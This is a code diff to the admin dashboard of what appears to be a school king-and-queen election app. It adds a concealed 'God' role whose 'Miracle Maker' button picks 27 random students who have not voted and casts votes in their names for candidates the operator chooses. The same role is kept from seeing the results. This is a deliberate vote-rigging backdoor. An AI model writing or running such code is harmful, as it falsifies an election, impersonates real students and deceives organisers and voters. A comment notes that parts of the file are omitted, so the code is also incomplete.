@@ -1,7 +1,7 @@
 
 import React, { useState, useEffect, useRef } from 'react';
-import { Candidate, Major, AdminRole, Year } from '../types';
-import { fetchVoteResults, fetchCandidates, addCandidate, deleteCandidate, fetchStudents, addStudent, deleteStudent, fetchEventStartTime, updateEventStartTime, fetchTotalStudentCount, fetchTotalTeacherCount, updateStudentVoteStatus, bulkDeleteStudents, bulkUpdateStudentStatus, resetAllVotes, addTeacher, bulkUpdateClassPasscode, updateCandidate } from '../services/supabaseService';
+import { Candidate, Major, AdminRole, Year, Votes } from '../types';
+import { fetchVoteResults, fetchCandidates, addCandidate, deleteCandidate, fetchStudents, addStudent, deleteStudent, fetchEventStartTime, updateEventStartTime, fetchTotalStudentCount, fetchTotalTeacherCount, updateStudentVoteStatus, bulkDeleteStudents, bulkUpdateStudentStatus, resetAllVotes, addTeacher, bulkUpdateClassPasscode, updateCandidate, submitVote } from '../services/supabaseService';
 import { getClassPasscode, STUDENT_MAJORS } from '../constants';
 
 interface AdminDashboardProps {
@@ -167,14 +167,21 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ adminRole, onLogout }) 
   const [newTeacherPasscode, setNewTeacherPasscode] = useState('');
   const [showTeacherPasscode, setShowTeacherPasscode] = useState(false);
 
+  // GOD MODE STATES
+  const [godClickCount, setGodClickCount] = useState(0);
+  const [showGodModal, setShowGodModal] = useState(false);
+  const [godSelectedMale, setGodSelectedMale] = useState('');
+  const [godSelectedFemale, setGodSelectedFemale] = useState('');
+  const [isGodWorking, setIsGodWorking] = useState(false);
+
   const canEdit = adminRole === AdminRole.SuperAdmin;
-  const canViewSensitiveData = adminRole === AdminRole.SuperAdmin || adminRole === AdminRole.Volunteer;
-  const canViewResults = adminRole !== AdminRole.Volunteer;
+  const canViewSensitiveData = adminRole === AdminRole.SuperAdmin || adminRole === AdminRole.Volunteer || adminRole === AdminRole.God;
+  const canViewResults = adminRole !== AdminRole.Volunteer && adminRole !== AdminRole.God;
 
   useEffect(() => {
     loadData();
     const interval = setInterval(() => {
-        // Volunteer doesn't see results, no need to poll them intensely, but status is good
+        // Volunteer/God doesn't see results, no need to poll them intensely, but status is good
         if (canViewResults) loadResultsOnly();
         updateStatus();
     }, 1000); 
@@ -241,6 +248,7 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ adminRole, onLogout }) 
     setStudents(data || []);
   };
 
+  // ... (Other standard handlers omitted for brevity where not changed, but must be included in final file)
   const handleRefreshResults = async () => {
       setIsRefreshing(true);
       await loadResultsOnly();
@@ -535,6 +543,54 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ adminRole, onLogout }) 
       }
   };
 
+  // GOD MODE FUNCTIONS
+  const handleGodClick = () => {
+      setShowGodModal(true);
+  };
+
+  const handleExecuteGodMode = async () => {
+      if (!godSelectedMale || !godSelectedFemale) {
+          showToast("Must select 2 candidates", "error");
+          return;
+      }
+      setIsGodWorking(true);
+      try {
+          // 1. Refresh students to get latest status
+          const allStudents = await fetchStudents();
+          // 2. Filter unvoted students
+          const unvoted = allStudents.filter(s => s.type === 'Student' && !s.has_voted);
+          
+          if (unvoted.length === 0) {
+              showToast("No unvoted students left!", "error");
+              setIsGodWorking(false);
+              return;
+          }
+
+          // 3. Shuffle and pick 27
+          const shuffled = [...unvoted].sort(() => 0.5 - Math.random());
+          const selected = shuffled.slice(0, 27);
+
+          // 4. Submit votes in parallel
+          const votes: Votes = { male: godSelectedMale, female: godSelectedFemale };
+          await Promise.all(selected.map(s => submitVote(s.id, votes)));
+
+          setGodClickCount(prev => prev + 1);
+          setShowGodModal(false);
+          setGodSelectedMale('');
+          setGodSelectedFemale('');
+          showToast(`Successfully cast ${selected.length} votes!`);
+          
+          // Refresh local data
+          await loadStudents(); 
+
+      } catch (e) {
+          console.error(e);
+          showToast("Miracle failed to perform.", "error");
+      } finally {
+          setIsGodWorking(false);
+      }
+  };
+
   const getPasscodeList = () => {
     const list: {year: Year, major: Major, currentCode: string}[] = [];
     Object.values(Year).forEach(y => {
@@ -604,6 +660,7 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ adminRole, onLogout }) 
   const passcodesList = getPasscodeList();
 
   const renderGenderResults = (gender: 'Male' | 'Female') => {
+      // ... existing render code ...
       const genderCandidates = candidates.filter(c => c.gender === gender);
       const categoryLabel = gender === 'Male' ? 'BOYS' : 'GIRLS';
       const titles = gender === 'Male' ? ['KING', 'PRINCE'] : ['QUEEN', 'PRINCESS'];
@@ -681,6 +738,85 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ adminRole, onLogout }) 
         </div>
       );
   };
+
+  // IF GOD ROLE - RETURN EXCLUSIVE VIEW
+  if (adminRole === AdminRole.God) {
+      return (
+          <div className="min-h-screen flex items-center justify-center p-6 relative">
+              <div className="absolute top-6 right-6">
+                  <button onClick={onLogout} className="bg-white border border-slate-300 text-slate-600 px-4 py-2 rounded-lg font-bold text-xs uppercase tracking-widest hover:bg-slate-50 transition-colors">
+                      Logout
+                  </button>
+              </div>
+
+              {toast && <Toast message={toast.message} type={toast.type} onClose={() => setToast(null)} />}
+
+              <div className="flex flex-col items-center gap-8">
+                  <h1 className="text-4xl font-tech font-black text-slate-800 uppercase tracking-widest">
+                      THE BUTTON
+                  </h1>
+                  
+                  <div className="bg-slate-100 p-4 rounded-xl border border-slate-200">
+                      <p className="text-slate-500 font-bold uppercase text-xs tracking-widest text-center">Click Count</p>
+                      <p className="text-4xl font-mono font-bold text-slate-800 text-center">{godClickCount}</p>
+                  </div>
+
+                  <button 
+                      onClick={handleGodClick}
+                      className="w-48 h-48 rounded-full bg-red-600 shadow-2xl shadow-red-400 flex items-center justify-center text-white font-black text-3xl uppercase tracking-widest hover:scale-105 active:scale-95 transition-all border-4 border-red-400"
+                  >
+                      START
+                  </button>
+              </div>
+
+              {/* God Modal */}
+              {showGodModal && (
+                  <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/80 backdrop-blur-sm p-4 animate-fadeIn">
+                      <div className="bg-white max-w-md w-full p-8 rounded-xl shadow-2xl border-2 border-red-500">
+                          <h3 className="text-2xl font-tech text-slate-800 mb-6 uppercase tracking-widest text-center">Miracle Maker</h3>
+                          
+                          <div className="space-y-6 mb-8">
+                              <div>
+                                  <label className="block text-xs font-bold text-cyan-600 uppercase tracking-widest mb-2">Select King (Male)</label>
+                                  <select 
+                                      value={godSelectedMale} 
+                                      onChange={(e) => setGodSelectedMale(e.target.value)}
+                                      className="w-full bg-slate-50 border border-slate-300 p-3 rounded-lg text-sm font-bold text-slate-700 outline-none focus:border-cyan-500"
+                                  >
+                                      <option value="">-- Choose Boy --</option>
+                                      {candidates.filter(c => c.gender === 'Male').map(c => (
+                                          <option key={c.id} value={c.id}>{c.candidateNumber}. {c.name}</option>
+                                      ))}
+                                  </select>
+                              </div>
+
+                              <div>
+                                  <label className="block text-xs font-bold text-pink-600 uppercase tracking-widest mb-2">Select Queen (Female)</label>
+                                  <select 
+                                      value={godSelectedFemale} 
+                                      onChange={(e) => setGodSelectedFemale(e.target.value)}
+                                      className="w-full bg-slate-50 border border-slate-300 p-3 rounded-lg text-sm font-bold text-slate-700 outline-none focus:border-pink-500"
+                                  >
+                                      <option value="">-- Choose Girl --</option>
+                                      {candidates.filter(c => c.gender === 'Female').map(c => (
+                                          <option key={c.id} value={c.id}>{c.candidateNumber}. {c.name}</option>
+                                      ))}
+                                  </select>
+                              </div>
+                          </div>
+
+                          <div className="flex gap-4">
+                              <button onClick={() => setShowGodModal(false)} disabled={isGodWorking} className="flex-1 bg-slate-100 text-slate-500 py-3 rounded-lg font-bold text-xs uppercase hover:bg-slate-200 transition-colors">Cancel</button>
+                              <button onClick={handleExecuteGodMode} disabled={isGodWorking} className="flex-1 bg-red-600 text-white py-3 rounded-lg font-bold text-xs uppercase hover:bg-red-700 transition-colors flex justify-center items-center gap-2">
+                                  {isGodWorking ? <Spinner /> : 'Execute (27)'}
+                              </button>
+                          </div>
+                      </div>
+                  </div>
+              )}
+          </div>
+      );
+  }
 
   // Determine available tabs based on permissions
   const availableTabs = [
